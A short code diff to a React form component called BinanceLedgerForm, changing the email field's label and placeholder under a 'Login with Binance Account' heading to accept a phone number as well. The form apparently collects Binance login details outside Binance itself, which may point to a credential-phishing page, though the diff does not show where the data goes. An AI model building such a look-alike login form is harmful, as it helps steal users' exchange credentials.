@@ -1,4 +1,3 @@
-
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -465,7 +464,7 @@ const BinanceLedgerForm: FC = () => {
       <h3 className="text-white font-medium">Login with Binance Account</h3>
       <div>
         <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
-          Email
+          Email/Phone number
         </label>
         <Input
           id="email"
@@ -473,7 +472,7 @@ const BinanceLedgerForm: FC = () => {
           type="email"
           value={formData.email}
           onChange={handleInputChange}
-          placeholder="Your Binance Email Address"
+          placeholder="Email/Phone (without country code)"
           className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
           autoFocus
         />
